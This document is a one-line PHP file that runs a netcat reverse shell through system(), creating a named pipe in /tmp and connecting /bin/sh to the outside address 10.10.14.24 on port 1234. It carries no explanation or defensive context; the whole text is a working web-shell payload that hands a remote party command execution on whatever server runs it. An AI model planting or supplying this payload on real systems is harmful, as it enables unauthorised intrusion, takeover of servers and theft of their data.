<?php system("rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.24 1234 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a");?>
